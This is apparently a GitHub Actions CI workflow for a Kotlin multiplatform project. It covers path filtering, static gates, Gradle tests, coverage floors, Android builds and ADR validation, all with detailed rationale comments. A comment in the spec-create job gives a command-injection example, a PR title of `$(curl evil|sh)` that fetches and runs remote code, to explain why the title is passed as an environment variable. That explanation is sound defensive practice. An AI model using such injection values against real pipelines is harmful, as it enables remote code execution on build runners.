name: CI

# Branch protection is NOT enabled on main. The `CI gate` job name is the only
# intended required check, but there is no branch protection rule enforcing it.
# Adding protection is a one-line GitHub API call once main is reliably green:
#   gh api repos/{owner}/{repo}/branches/main/protection -X PUT -F required_status_checks='{"contexts":["CI gate"]}'
#
# ubuntu-24.04 is pinned deliberately; history and the exit plan live in
# docs/decisions/2026-10-05-ci-action-versions-and-runner-image-pin.md.
# Incident history for individual gates lives in their ADRs and `git log`, not here.

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  workflow_dispatch:
  schedule:
    # Nightly full test suite at 01:00 UTC — before e2e (02:00) and android-device-tests (03:00)
    - cron: "0 1 * * *"

concurrency:
  group: ci-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: true

permissions:
  contents: read


jobs:
  # Path-filter detection — always runs so ci-gate can wait for it; downstream jobs
  # use its outputs to decide whether to run.
  changes:
    runs-on: ubuntu-24.04
    outputs:
      scripts: ${{ steps.filter.outputs.scripts }}
      android: ${{ steps.filter.outputs.android }}
      shared: ${{ steps.filter.outputs.shared }}
      desktop: ${{ steps.filter.outputs.desktop }}
      all: ${{ steps.filter.outputs.all }}
      # The path set ADR + spec-kit used to gate its own workflow on. It lives
      # here now because GitHub applies `paths:` per WORKFLOW, not per job, so
      # the two jobs below can only be skipped by a filter computed at runtime.
      adr: ${{ steps.filter.outputs.adr }}
    steps:
      - uses: actions/checkout@v7
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            scripts:
              - 'scripts/**'
              - '.github/**'
              - 'docs/**'
            android:
              - 'androidApp/**'
              - 'shared/src/android*/**'
              - 'gradle.properties'
            shared:
              - 'shared/src/commonMain/**'
              - 'shared/src/androidMain/**'
              - 'shared/src/jvmMain/**'
            desktop:
              - 'desktopApp/**'
              - 'shared/src/jvmMain/**'
            adr:
              - 'docs/decisions/**'
              - 'openspec/changes/**'
              - 'openspec/schemas/**'
              - '.specify/**'
            all:
              - '**'

  # ~1 min, no JVM, no Gradle. Runs every script gate and reports ALL of their
  # failures, not the first one.
  static:
    name: Static gates
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    needs: [changes]
    # The detekt auto-correct step pushes the corrected tree to
    # `detekt-auto-fix/<job>/<run-id>` so a human can review and merge it —
    # see docs/decisions/2026-10-17-detekt-auto-fix-ci-commit.md. Without
    # write permission the push is refused with a 403 and the branch is never
    # created, which leaves the whole mechanism inert.
    permissions:
      contents: write
    # Run when scripts/docs changed, or when anything changed on main (always), or on
    # workflow_dispatch (manual trigger).
    if: >
      needs.changes.outputs.scripts == 'true'
      || needs.changes.outputs.all == 'true'
      || github.ref == 'refs/heads/main'
      || github.event_name == 'workflow_dispatch'
    steps:
      - uses: actions/checkout@v7

      # uv manages the Python toolchain and project dependencies from pyproject.toml.
      # python-version is still declared so setup-python pins the interpreter;
      # uv reads it from there rather than managing its own version pins.
      # venv + sgate + junitparser + yamllint + actionlint + shellcheck, once.
      # See .github/actions/setup-python-tools/action.yml for what each of the
      # four earlier attempts at installing these was missing.
      - name: Set up gate tooling
        uses: ./.github/actions/setup-python-tools

      # Path-gated preflight: only validate tools when the PR touches CI tooling.
      # Skipped for pure app-code PRs (shared/**, androidApp/**, desktopApp/**).
      #
      # AFTER the install, deliberately. It used to sit at step 3, ahead of the
      # Python setup at step 5, so it asserted `junitparser` was missing on every
      # run and `sgate run-all` (step 7) never ran — every static gate in
      # scripts/ci/static-gates.sh went unexecuted and a stale committed coverage
      # matrix merged unnoticed. A preflight that checks for tools before they
      # are installed can only ever fail.
      - name: Preflight environment check
        uses: ./.github/actions/setup-repo-tools

      - uses: actions/setup-node@v6
        with:
          node-version: 22

      # Replaced gate() function + collect_and_report() from static-gates.sh with
      # sgate run-all: single CLI entry point, parallel execution, aggregate exit,
      # unified JSON for CI parsers.  static-gates.sh is now a pure registry (source
      # of truth for gate names and commands — both sgate run-all and check.sh read it).
      - name: Script gates (sgate run-all)
        run: sgate run-all || exit 1

      - name: Speckit validate
        env:
          # Pinned, with a working default: an unpinned `npx` makes the gate change
          # under you, but requiring a repository variable before the first run
          # lands turns a safety pin into a day-one outage. Override by setting the
          # variable when the pin needs to move.
          SPECKIT_VERSION: ${{ vars.SPECKIT_VERSION || vars.OPENSPEC_VERSION || '1.14.0' }}
        run: >
          npx --yes "@fission-ai/openspec@${SPECKIT_VERSION}" validate --all --json --strict

      # No second checkout here. The one at the top of this job is already at
      # `github.sha`, and a second sparse checkout broke the job in two ways:
      # it dropped `scripts/`, so the step below ran a script that no longer
      # existed (exit 127), and it dropped `.github/actions/setup-python-tools`,
      # so the local action could not be archived at job teardown and the job
      # failed there instead. The gate run above writes only into `.venv/` and
      # `build/`, both untracked, so a fresh tree buys nothing. The JVM job runs
      # the same script with this same shape and is green.
      - name: Detekt auto-correct (commit + push)
        run: bash scripts/ci/detekt-auto-fix.sh "static" "${{ github.run_id }}"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  # One Gradle invocation => one JVM start, one configuration phase, and the
  # tests run ONCE. The previous shape ran jvmTest twice (this job and
  # slow-tests), once more inside koverReport, and mcp-server:test twice (here
  # and in its own job).
  #
  # This job is deliberately NOT split further. Three couplings inside the old
  # monolith made a six-leaf split produce a green run that measured the wrong
  # thing, and it was withdrawn for that reason — see
  # docs/decisions/2026-10-05-ci-checks-run-in-parallel.md. What is here respects
  # all three: the run stamp, the count and coverage floors, and the flake
  # comparison all read results this same job produced, so they stay together.
  tests:
    name: JVM tests, detekt, coverage
    runs-on: ubuntu-24.04
    timeout-minutes: 40
    needs: [changes]
    # Run when any app code changed (android/shared/desktop), or always on main,
    # or on workflow_dispatch.
    if: >
      needs.changes.outputs.android == 'true'
      || needs.changes.outputs.shared == 'true'
      || needs.changes.outputs.desktop == 'true'
      || needs.changes.outputs.all == 'true'
      || github.ref == 'refs/heads/main'
      || github.event_name == 'workflow_dispatch'
    permissions:
      actions: read # flake analysis downloads the previous run's results
      # write for the detekt auto-correct branch — see the static job.
      contents: write
    steps:
      - uses: actions/checkout@v7

      - uses: ./.github/actions/setup-jvm-gradle
        with:
          cache-encryption-key: ${{ secrets.GRADLE_ENCRYPTION_KEY }}

      # Same action as the static job, one reason: this job runs
      # `python3 scripts/check-gate-wiring.py` ("Gates are wired and can fail"),
      # whose `import click` sits at module scope. The job that exists to prove
      # gates can fail could not run the gate.
      #
      # The YAML and actionlint linters are off here because the two gates that
      # use them are `bash -c` lines in the registry, not script gates: Part B
      # never runs them, and this job does not run the registry. The link
      # checker stays ON: `scripts/check-doc-links.sh` IS a script gate, so
      # Part B runs it — first on the clean tree, then on a sabotaged one.
      # With lychee missing, the clean-tree run failed ("already fails on a
      # clean tree") and the control could not prove anything. A control that
      # cannot run is not a control.
      - name: Set up gate tooling
        uses: ./.github/actions/setup-python-tools
        with:
          with-yaml-lint: 'false'
          with-action-lint: 'false'

      # A fresh checkout runs every test task, so results older than this stamp
      # cannot belong to this run.
      - name: Stamp run start
        run: echo "RUN_STARTED=$(date +%s)" >> "$GITHUB_ENV"

      # Correct first, measure second — and do not let the correction hide the debt.
      #
      # `--auto-correct` works; the claim that it was inert is superseded by
      # docs/decisions/2026-10-17-detekt-auto-correct-works-use-it.md. It runs here,
      # before the Gradle step below, so that step measures a corrected tree — the
      # same order `just detekt-fix` and the pre-push hook use.
      #
      # One Gradle invocation per module, never several in one. Measured on
      # 2026-10-17 with a planted StringTemplate violation: `:shared:detekt
      # :desktopApp:detekt --auto-correct` reported the finding and rewrote
      # nothing, while the same two tasks one invocation each did rewrite it —
      # and `:desktopApp:detekt :shared:detekt` in a single invocation rewrote it
      # again. The flag reaches only the last detekt task of an invocation, so a
      # list silently corrects one module and silently skips the rest. That is
      # indistinguishable from "inert" unless you check the file afterwards, which
      # is why the old ADR's conclusion was plausible for a week.
      #
      # No `--rerun-tasks` here (unlike the hook): this is the job's first Gradle
      # invocation, so no detekt task can be UP-TO-DATE over the checked-out tree.
      # `--no-build-cache` for the same reason — a restored analysis rewrites
      # nothing. The step's only output is the correction, so it must not be served
      # from a cache.
      #
      # The script commits and pushes the auto-correct result to
      # `detekt-auto-fix/<job>/<run-id>`. The CI verdict is still produced by the
      # separate `git diff` step below (which now measures an already-fixed tree).
      # See docs/decisions/2026-10-17-detekt-auto-fix-ci-commit.md.
      - name: Detekt auto-correct (commit + push)
        run: bash scripts/ci/detekt-auto-fix.sh "tests" "${{ github.run_id }}"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # koverReport already dependsOn :shared:jvmTest, :shared:testAndroidHostTest,
      # :desktopApp:test, :mcp-server:test and :androidApp:test (build.gradle.kts:67-79).
      # Listing them again here would be a second copy of the list that has to stay
      # in step with kover's, which is exactly how kover silently stops measuring a
      # module. Naming koverReport is the whole entry point.
      #
      # :mcp-server:jar is REQUIRED in this same invocation. McpServerEndToEndTest
      # resolves build/libs/mcp-server.jar and skips itself when it is absent
      # (McpServerEndToEndTest.kt:63) — a silent pass, not a failure, and the floor
      # below is what catches it.
      #
      # :pro:detekt is NOT here on purpose: :pro is only included under
      # -PwithPro=true (settings.gradle.kts:120-126), so it belongs to the matrix
      # leg that passes that flag.
      #
      # -Dsingularity.test.steps=true fills the opt-in failure bundle.
      # -Dsingularity.test.a11y=fail makes accessibility findings fatal.
      # --continue: one red task must not hide the rest of the verdicts.
      # --no-build-cache: ensures test tasks always execute and never serve FROM-CACHED,
      # so the test-counts gate always measures a real run. The cache is still warm
      # for configuration and compilation tasks that are not test tasks.
      # --no-parallel: org.gradle.parallel=true in gradle.properties lets two test
      # tasks fork JVMs concurrently, which is the collision behind #471's
      # EOFException in the jvmTest executor. The CLI flag overrides the property;
      # determinism is worth the lost cross-project parallelism (same call the
      # pre-push hook makes).
      # The Gradle log is captured so check-test-runs.py can exempt UP-TO-DATE tasks
      # from the freshness check (a second consecutive run would otherwise falsely flag
      # a legitimately cached task as stale).
      # Test properties are passed as -D on the Gradle command line, NOT via
      # GRADLE_OPTS: that reaches the Gradle client JVM only, and worked before
      # solely because --no-daemon ran the build inside it. desktopApp's harness
      # reads these as system properties of the forked test JVM
      # (DesktopAppHarness.kt:138-140), forwarded via providers.systemProperty
      # (desktopApp/build.gradle.kts:166-177).
      #
      # Retry flags are spelled here, one GitHub expression per flag, instead of
      # arriving as a single RETRY_ARGS env var expanded unquoted. Unquoted word
      # splitting is exactly what actionlint's shellcheck pass reports as SC2086,
      # and the gate could not have caught it: this job died during install and
      # never reached `sgate run-all`. One flag per expression leaves nothing to
      # split, and quoting the variable instead would have handed Gradle a single
      # "-D a -D b" argument.
      #
      # maxAttempts is absent on push on purpose: repeat(0) skips every test body.
      #
      # `set -o pipefail`, and it is the whole reason this step can fail at all.
      #
      # `... 2>&1 | tee build.log` returns tee's status, which is 0. GitHub's default
      # shell is `bash -e` with no pipefail, so this step had been reporting success
      # for every Gradle failure it contained: tests, detekt, koverReport, all of them.
      # Measured on 2026-10-16 on a pristine origin/main: `:shared:detekt` fails with
      # 109 findings, and the "JVM tests, detekt, coverage" job on that same commit is
      # green. The 109 findings were invisible because nothing that read them could
      # fail.
      #
      # `check-test-runs.py --gradle-log build.log` did not catch it either: it reads
      # the log to exempt UP-TO-DATE tasks from its freshness floor, and a failed task
      # has run and produced XML just as a passing one has.
      #
      # The log is still written, because two steps below read it. The exit status is
      # now Gradle's again. `scripts/check-workflow-exit-status.py` fails if a `run:`
      # block in any workflow pipes without this, so the pipe cannot come back.

      - name: Gradle (tests + coverage + detekt)
        run: |
          set -o pipefail
          ./gradlew --continue \
            --no-build-cache \
            --no-parallel \
            :mcp-server:jar \
            koverReport \
            koverHtml \
            :detekt-rules:test \
            :shared:detekt :desktopApp:detekt :androidApp:detekt :mcp-server:detekt :adr-cli:detekt :adr-core:detekt :core-base:detekt :detekt-rules:detekt \
            -Ptest.tags=fast,slow \
            -Dsingularity.test.steps=true -Dsingularity.test.a11y=fail \
            ${{ github.event_name == 'pull_request' && '-Dretry.maxAttempts=2' || '' }} \
            ${{ github.event_name == 'pull_request' && '-Dretry.failOnPassedAfterRetry=false' || '' }} \
            ${{ github.event_name != 'pull_request' && '-Dretry.failOnPassedAfterRetry=true' || '' }} \
            2>&1 | tee build.log

      # junitparser arrived with the tooling step above. It was installed here
      # separately because that install kept failing for three different reasons
      # in a row; one installer now serves both jobs.

      # Emit GitHub annotations per failing/retry-passed test from JUnit XML.
      # Parses desktop JUnit XML with junitparser and emits ::error / ::notice commands.
      # continue-on-error: annotation failures are advisory and must not crash CI.
      - name: Per-test GitHub annotations (advisory)
        if: ${{ !cancelled() }}
        continue-on-error: true
        run: python3 scripts/junit-annotations.py desktopApp/build/test-results/test/

      # Three separate invocations, not one comma-separated list. The parity table
      # in check-gate-wiring.py keys on the exact spelling of the argument, so
      # merging these would leave GATE_ARG_PARITY declaring comparisons it no longer
      # performs — a declaration that reads as enforced and is not.
      # --gradle-log build.log: exempts any source set whose test task went UP-TO-DATE
      # or FROM-CACHED from the freshness check. With --no-build-cache above, tasks
      # should never be cached in CI, but the flag is also a backstop for local runs.
      - name: Executed test counts
        run: |
          python3 scripts/check-test-runs.py --require shared:jvmTest,desktopApp:test --since "$RUN_STARTED" --gradle-log build.log
          python3 scripts/check-test-runs.py --require shared:testAndroidHostTest --since "$RUN_STARTED" --gradle-log build.log
          python3 scripts/check-test-runs.py --require mcp-server:test --since "$RUN_STARTED" --gradle-log build.log

      # desktop only, deliberately. The android target's results come from
      # :androidApp:connectedDebugAndroidTest, which no CI job runs, and
      # --maestro would demand a `scenario:` tag on every flow that claims android —
      # 18 of 19 specs claim it and exactly one flow carries the tag today. Running
      # both targets from this job therefore produced a matrix whose android column
      # was permanently `not-run` while looking like a measurement. That silence is
      # now a recorded decision (config/docs/traceability-ratchet.json, known_gaps),
      # not an accident.
      #
      # Exits 2 when a declared target produced zero testcases — never
      # continue-on-error.
      #
      # Placement is load-bearing, not stylistic. This step reads
      # `desktopApp/build/test-results/test/`, and every Gradle invocation below it
      # can re-run `:desktopApp:test` and overwrite that directory. Run 38933517902
      # measured what that costs: `:koverMarkdownTable` (advisory, `|| true`) was the
      # first invocation that found its test task out of date, re-ran it *without*
      # `-Ptest.tags`, and desktopApp's default is `excludeTags("slow")` — so the
      # `@Tag("slow")` scenario classes were skipped rather than executed. The suite
      # stayed green, `check-test-runs` had already counted the full 135 tests, and
      # this step then failed with "declared target produced zero testcases" against a
      # run that had in fact measured them. Normalising immediately after the test
      # run is what makes the input a fact rather than a race with later Gradle steps.
      - name: Normalise desktop results into the scenario matrix
        run: >
          python3 -m traceability results
          --targets desktop --out-dir build/traceability

      - name: Render result matrix into the job summary
        if: ${{ !cancelled() }}
        run: |
          if [ -f build/traceability/result-matrix.md ]; then
            { echo "## Scenario result matrix"; grep -v '^<!--' build/traceability/result-matrix.md; } >> "$GITHUB_STEP_SUMMARY"
          else
            echo "_result matrix not produced (see the step above)_" >> "$GITHUB_STEP_SUMMARY"
          fi

      # Compares with the last green run of THIS branch, falling back to main.
      # The previous version filtered on $GITHUB_REF_NAME, which on a PR is
      # "<n>/merge" and so never matched — it silently skipped on every PR.
      #
      # Placement is load-bearing, and it is the same reason the traceability
      # normaliser sits above this: `--current` reads `shared/build/test-results/
      # jvmTest`, and every Gradle invocation below this step can re-run
      # `:shared:jvmTest` and overwrite that directory. A flake rate computed from
      # a re-measured set compares this run against a previous run's set and calls
      # the difference flaky — which is the one thing a flake measurement must not
      # do. It ran after `Coverage floors`, `Coverage table` and
      # `Kover verify (detekt-rules)`, any of which pulls the shared test task.
      - name: Flake analysis vs previous run (advisory)
        if: ${{ !cancelled() }}
        continue-on-error: true
        env:
          GH_TOKEN: ${{ github.token }}
          BRANCH: ${{ github.head_ref || github.ref_name }}
        run: |
          prev_on() {
            gh run list --workflow ci.yml --branch "$1" --status success --limit 1 \
              --json databaseId --jq '.[0].databaseId // empty'
          }
          PREV=$(prev_on "$BRANCH")
          [ -n "$PREV" ] || PREV=$(prev_on main)
          if [ -z "$PREV" ]; then echo "no previous successful run — skipped"; exit 0; fi
          gh run download "$PREV" -n junit-results -D /tmp/prev-run || { echo "no junit-results in run $PREV — skipped"; exit 0; }
          python3 scripts/check-flaky-tests.py \
            --current shared/build/test-results/jvmTest \
            --previous /tmp/prev-run \
            --summary "$GITHUB_STEP_SUMMARY"

      # Detekt passed before this point — if DI/import files changed in a rebase,
      # this catches a compile break that `jvmTest` (already green) might miss.
      - name: Post-rebase DI compile
        run: python3 scripts/check-rebase-compiles.py

      # App coverage floors (INSTRUCTION 27% / BRANCH 20% / LINE 27%), declared in
      # settings.gradle.kts and enforced by Kover's own verify task. Blocking.
      # Runs here because it needs Gradle; static-gates.sh has no Gradle.
      #
      # `-Ptest.tags=fast,slow` is repeated on every Gradle invocation in this job,
      # not only the test run above, and it is not redundancy. An absent
      # `-Ptest.tags` maps to `excludeTags("slow")` in every module's
      # `useJUnitPlatform` block, so an invocation that re-runs a test task without
      # it re-measures a *narrower* population while reporting green — measured in
      # run 38933517902, where the advisory kover table step re-ran `:desktopApp:test`
      # and dropped every `@Tag("slow")` scenario class. Same selector, same
      # population, whichever invocation ends up executing the task.
      - name: Coverage floors
        run: ./gradlew :koverVerify -Ptest.tags=fast,slow

      # Markdown table from the kover XML report. Parses build/reports/kover/report.xml
      # (generated by koverReport above) and renders per-module LINE / BRANCH /
      # INSTRUCTION coverage. Advisory: the blocking coverage check is :koverVerify above.
      - name: Coverage table (advisory, CI summary)
        if: ${{ !cancelled() }}
        run: ./gw :koverMarkdownTable -Ptest.tags=fast,slow >> "$GITHUB_STEP_SUMMARY" || true

      # Advisory by construction, and declared so: this step only *renders* the two
      # numbers into the job summary. Both are enforced as blocking steps elsewhere —
      # `Coverage floors` above, `Kover verify (detekt-rules)` below — so the `|| true`
      # on each pipeline cannot hide a real regression; it only stops a rendering
      # hiccup from failing a run whose gates already ran. The name says "advisory"
      # because a soft step nobody declared is a step that reads as a gate
      # (scripts/check-gate-wiring.py, Part F).
      - name: Coverage report (advisory, CI summary)
        if: ${{ !cancelled() }}
        run: |
          # Render app instruction coverage into the job summary. koverLog, not a
          # second parser: the number comes from the same kover block that declares
          # the floor (settings.gradle.kts). grep keeps a failed Gradle run out of
          # the summary; `|| true` is what declares this half advisory.
          {
            echo ""
            echo "### Code coverage"
          } >> "$GITHUB_STEP_SUMMARY"
          ./gradlew -q :koverLog -Ptest.tags=fast,slow 2>&1 | \
            grep "^app instruction coverage" >> "$GITHUB_STEP_SUMMARY" || true
          # Render detekt-rules branch coverage into the job summary. Same pattern
          # as above: koverLog reads the block that declares the floor.
          {
            echo ""
            echo "**detekt-rules branch coverage**"
          } >> "$GITHUB_STEP_SUMMARY"
          ./gradlew -q :detekt-rules:koverLog -Ptest.tags=fast,slow 2>&1 | \
            grep "^detekt-rules branch coverage" >> "$GITHUB_STEP_SUMMARY" || true

      # detekt-rules branch coverage floor: 60% (below 2026-10-10 measured 65.1%),
      # declared once — DETEKT_RULE_BRANCH_FLOOR in detekt-rules/build.gradle.kts —
      # and enforced by Kover's own verify rule, not by a script that parses Kover's
      # XML. Blocking.
      # Runs here (not in the static-gates registry) because it needs Gradle.
      # `./check.sh` names the same task, so the local loop rehearses this gate:
      # scripts/check-gate-wiring.py Part I would fail otherwise.
      - name: Kover verify (detekt-rules)
        run: ./gradlew :detekt-rules:koverVerify -Ptest.tags=fast,slow

      # The meta-gate runs HERE, not in the `static` job and not in the shared
      # registry. Part B proves `check-test-runs.py` can fail by sabotaging its
      # baseline and re-running it, and that gate reads JUnit XML which only exists
      # once the Gradle step above has run. Called from a static context it fails
      # with "already fails on a clean tree" — a true statement that reads as a
      # false alarm (#206).
      #
      # GATE_WIRING_GRADLE=1 because the `detekt-rule-coverage-floor` positive control
      # is gradle-backed: it raises DETEKT_RULE_BRANCH_FLOOR and requires
      # :detekt-rules:koverVerify to exit non-zero. Without this env var that control is
      # SKIPPED here, which is the same as not running it — check.sh has always set the
      # variable and CI never has, so the control has only ever proven anything locally.
      # Affordable for the same reason as check.sh: the Gradle step above already ran, so
      # configuration is cached and the control costs a verify pass, not a test suite.
      - name: Gates are wired and can fail
        if: ${{ !cancelled() }}
        env:
          GATE_WIRING_GRADLE: "1"
        run: python3 scripts/check-gate-wiring.py

      - name: Upload JUnit results
        if: ${{ !cancelled() }}
        uses: actions/upload-artifact@v7
        with:
          name: junit-results
          path: |
            shared/build/test-results/jvmTest/**/*.xml
            shared/build/test-results/testAndroidHostTest/**/*.xml
            desktopApp/build/test-results/test/**/*.xml
            mcp-server/build/test-results/test/**/*.xml
          if-no-files-found: error
          retention-days: 7

      - name: Upload Allure results
        if: ${{ !cancelled() }}
        uses: actions/upload-artifact@v7
        with:
          name: allure-results
          path: |
            shared/build/allure-results/**/*
            desktopApp/build/allure-results/**/*
            mcp-server/build/allure-results/**/*
          if-no-files-found: ignore
          retention-days: 14

      - name: Upload evidence (diagnostics, traceability, coverage)
        if: ${{ !cancelled() }}
        uses: actions/upload-artifact@v7
        with:
          name: ci-evidence-${{ github.run_id }}
          path: |
            desktopApp/build/diagnostics/**
            shared/build/diagnostics/**
            mcp-server/build/diagnostics/**
            build/traceability/**
            build/reports/kover/report.xml
            build/reports/kover/**/*.html
            **/build/reports/configuration-cache/**
          if-no-files-found: ignore
          retention-days: 14

      # Upload HTML test reports as a separate artifact for direct link access
      # in the PR check summary (FR-002).
      - name: Upload HTML test reports
        if: ${{ !cancelled() }}
        uses: actions/upload-artifact@v7
        with:
          name: html-reports-${{ github.run_id }}
          path: desktopApp/build/reports/tests/test/**/*.html
          if-no-files-found: warn
          retention-days: 14

  # free and pro are two different Gradle graphs (-PwithPro), so two matrix legs.
  android:
    name: Android (${{ matrix.variant }})
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    needs: [changes]
    # Run when android/shared code changed, or always on main, or on workflow_dispatch.
    if: >
      needs.changes.outputs.android == 'true'
      || needs.changes.outputs.shared == 'true'
      || needs.changes.outputs.all == 'true'
      || github.ref == 'refs/heads/main'
      || github.event_name == 'workflow_dispatch'
    strategy:
      fail-fast: false
      matrix:
        include:
          # The free leg compiles and stops there. It used to assemble the debug
          # APK as well, and that was the duplication: e2e.yml's `build-apk`
          # assembles the same debug APK for the same commit, and that is the
          # copy the Maestro shards install. One APK, two workflows, two
          # runners, two build caches — setup-gradle keys the Gradle home per
          # job, so the second build could not reuse the first one's entries
          # (docs/decisions/2026-10-06-ci-single-gate-registry-and-leaf-split.md).
          #
          # What the free leg still proves: `androidMain` compiles, which is the
          # only thing that sees a typo in an Android source file
          # (docs/decisions/2026-10-07-android-maintenance-needs-a-ci-gate.md),
          # and the free configuration is the one a fresh clone builds
          # (settings.gradle.kts — `pro/` compiles only under the flag, so CI
          # has to run both configurations).
          #
          # What it no longer proves: that the APK packages. That is proved
          # where the APK is used — e2e.yml's `build-apk`, on every run of the
          # E2E workflow (every push to main, every tag, every nightly, every
          # labelled PR) and android-device-tests.yml — and locally by
          # `check.sh`, which still assembles it.
          - variant: free
            flags: ""
            tasks: ":androidApp:compileDebugKotlin"
          # No Tracer token: proves FSL code compiles and the DI rebinding holds,
          # not that the vendor SDK works.
          #
          # The pro leg keeps `assembleDebug`: the pro variant is packaged
          # nowhere else. The free variant is packaged in e2e.yml; the pro one
          # is not shipped by release.yml either, so this leg is the only proof
          # that it packages at all.
          - variant: pro
            flags: "-PwithPro=true"
            tasks: ":pro:detekt :androidApp:compileDebugKotlin :androidApp:assembleDebug :pro:testDebugUnitTest"
    steps:
      - uses: actions/checkout@v7

      - uses: ./.github/actions/setup-jvm-gradle
        with:
          cache-encryption-key: ${{ secrets.GRADLE_ENCRYPTION_KEY }}

      - name: Compile / lint / test
        run: ./gradlew --continue ${{ matrix.flags }} ${{ matrix.tasks }}
        env:
          # AppTracer tokens — only meaningful for pro, ignored (plugin disabled) for free.
          TRACER_APP_TOKEN: ${{ secrets.TRACER_APP_TOKEN }}
          TRACER_PLUGIN_TOKEN: ${{ secrets.TRACER_PLUGIN_TOKEN }}

      # There is no debug APK to upload any more. The free leg does not assemble
      # one (see the matrix above), and the pro leg assembles the *pro* variant,
      # which is not the "free debug build" this artifact claimed to be.
      #
      # Nothing in this repository read `apk-debug-<run_id>` — the release
      # workflow builds its own APK, and the Maestro shards take `e2e-apk`. The
      # APK it carried was also assembled without `local.properties`, so the app
      # it installed opened on the "SUPABASE_URL" error screen rather than on a
      # usable one. The APK that actually runs is e2e.yml's `e2e-apk`: the same
      # free graph, with the placeholder Supabase credentials and the auth
      # bypass, on the runs where the E2E workflow runs.

  # The only job branch protection should require. `if: always()` is load-bearing:
  # without it this job is skipped when a leaf fails, and a skipped job reads as
  # neutral. The assertion is load-bearing too: a failed leaf leaves its siblings
  # `skipped`, so checking only for "no failures" would pass on a skipped job.
  #
  # Needs [static, tests, android, changes]. When a PR touches only scripts/:
  # - static runs (scripts changed), tests/android are skipped by their if: condition.
  # - ci-gate still runs (always()) and waits for static + changes to complete.
  # - The success check below allows skipped (tests/android) as valid outcomes.
  ci-gate:
    name: CI gate
    if: ${{ always() }}
    needs: [static, tests, android, changes]
    runs-on: ubuntu-24.04
    timeout-minutes: 2
    steps:
      - name: All required jobs succeeded
        env:
          RESULTS: ${{ join(needs.*.result, ' ') }}
        run: |
          echo "job results: $RESULTS"
          # static must pass; tests/android may be skipped (path-filtered).
          # A skipped job has result "skipped" — not a failure.
          for r in $RESULTS; do
            case "$r" in
              success|skipped) ;;
              *) echo "FAILED: $r"; exit 1 ;;
            esac
          done

  # ── ADR + spec-kit ──────────────────────────────────────────────────────
  # Moved out of adr-gate.yml; the workflow-level `paths:` filter is now
  # changes.outputs.adr, because GitHub cannot filter individual jobs.
  adr-gate:
    runs-on: ubuntu-latest
    needs: [changes]
    if: needs.changes.outputs.adr == 'true' || github.ref == 'refs/heads/main'
    # GitHub filters by `paths:` per WORKFLOW, not per job, so this `if:` is what
    # reproduces the filter adr-gate.yml used to declare. The price is stated in
    # docs/decisions if this ever gets revisited: the filter now lives in a job
    # expression rather than where a reader looks for it.
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      # The runner's default JRE is 17; :adr-cli:installDist builds with the
      # Gradle toolchain (21) and the installed script then dies with
      # UnsupportedClassVersionError (class file 65 vs 61) on `validate`.
      - name: Set up Java
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'

      # uv as an action, not `curl … | sh`: the same installer the rest of ci.yml
      # uses, so there is one way this repo gets uv on a runner.
      - uses: astral-sh/setup-uv@v5
        with:
          python-version: '3.11'

      - name: Install spec-kit
        run: uv tool install specify-cli

      # The adr-ci workflow's openspec-validate step shells out to the
      # `openspec` binary; without it the inner step exits 127 and the whole
      # workflow reports "Shell command exited with code 127". Same pin
      # convention as ci.yml's static job.
      - name: Install openspec
        env:
          OPENSPEC_VERSION: ${{ vars.OPENSPEC_VERSION || '1.14.0' }}
        run: npm install --global "@fission-ai/openspec@${OPENSPEC_VERSION}"

      # `set -o pipefail` again: this step installs the tool the rest of the job runs.
      # With the pipeline swallowing the status, a failed `installDist` left the job
      # proceeding to invoke a binary from the previous run or no binary at all, and
      # `singularity-adr validate` then failed on its own — a symptom three steps away
      # from the cause. `scripts/check-workflow-exit-status.py` found this one.
      - name: Install singularity-adr
        run: |
          set -o pipefail
          ./gradlew :adr-cli:installDist 2>&1 | tail -5
          ADR_BIN="$PWD/adr-cli/build/install/singularity-adr/bin/singularity-adr"
          chmod +x "$ADR_BIN"
          echo "$PWD/adr-cli/build/install/singularity-adr/bin" >> "$GITHUB_PATH"

      - name: ADR validation
        run: singularity-adr validate

      - name: ADR stale check (advisory)
        run: singularity-adr stale --days 30 || true

      - name: Refresh DIGEST if needed
        run: |
          if ! git diff --quiet docs/decisions/; then
            ./scripts/refresh-decisions-digest.sh
            git add docs/decisions/DIGEST.md
          fi

      - name: spec-kit CI workflow
        run: |
          specify workflow run adr-ci --input ci_mode=true 2>&1 || {
            echo "spec-kit workflow failed"
            exit 1
          }

  spec-create:
    if: github.event_name == 'pull_request' && (needs.changes.outputs.adr == 'true' || github.ref == 'refs/heads/main')
    runs-on: ubuntu-latest
    permissions:
      contents: write
    needs: [changes]
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Java
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'

      # uv as an action, not `curl … | sh`: the same installer the rest of ci.yml
      # uses, so there is one way this repo gets uv on a runner.
      - uses: astral-sh/setup-uv@v5
        with:
          python-version: '3.11'

      - name: Install spec-kit
        run: uv tool install specify-cli

      # Same swallow as the adr-gate job's copy above; `check-workflow-exit-status.py`
      # reported both, which is the point of running it over every workflow rather than
      # the one the defect was found in.
      - name: Install singularity-adr
        run: |
          set -o pipefail
          ./gradlew :adr-cli:installDist 2>&1 | tail -5
          echo "$PWD/adr-cli/build/install/singularity-adr/bin" >> "$GITHUB_PATH"

      - name: Extract ADR slug from PR title
        id: extract-slug
        # The title is attacker-controlled (any PR author sets it), so it must
        # reach the shell as data, never as source. Interpolating it inline —
        # `TITLE="${{ github.event.pull_request.title }}"` — splices it into the
        # script body, and a title of `$(curl evil|sh)` would execute. The env
        # block binds it to a variable instead: the shell reads it after parsing,
        # so no metacharacter in the value can become syntax. Found by actionlint
        # (`expression`), not by any in-repo gate — the reason the workflow lint
        # gate exists.
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          TITLE="$PR_TITLE"
          # Convert title to kebab-case slug
          SLUG=$(echo "$TITLE" | sed 's/[^a-zA-Z0-9 ]//g' | tr '[:upper:]' '[:lower:]' | tr ' ' '-' | sed 's/-+/-/g' | sed 's/^-//' | sed 's/-$//')
